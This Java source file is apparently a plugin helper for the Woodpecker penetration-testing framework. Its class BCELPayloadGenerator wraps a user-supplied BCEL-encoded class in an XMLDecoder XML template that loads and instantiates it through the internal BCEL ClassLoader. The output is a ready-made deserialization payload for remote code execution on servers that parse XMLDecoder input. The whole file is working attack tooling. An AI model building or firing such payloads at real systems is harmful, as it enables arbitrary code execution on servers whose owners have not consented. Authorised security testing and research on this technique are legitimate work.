package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class BCELPayloadGenerator implements IHelper {

    public String getHelperTabCaption() {
        return "bcel";
    }

    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = XMLDecoderPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg argHost = XMLDecoderPlugin.pluginHelper.createArg();
        argHost.setName("bcel_string");
        argHost.setType(IArg.ARG_TYPE_STRING);
        argHost.setDefaultValue("$$BCEL$$...");
        argHost.setDescription("bcel字符串");
        argHost.setRequired(true);
        args.add(argHost);

        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        String bcel_string = (String)customArgs.get("bcel_string");
        String payload = String.format("<java><void class =\"com.sun.org.apache.bcel.internal.util.ClassLoader\"><void method=\"loadClass\"><string>%s</string><void method=\"newInstance\"></void></void></void></java>",bcel_string);

        resultOutput.rawPrintln("\n" + payload + "\n");
    }
}
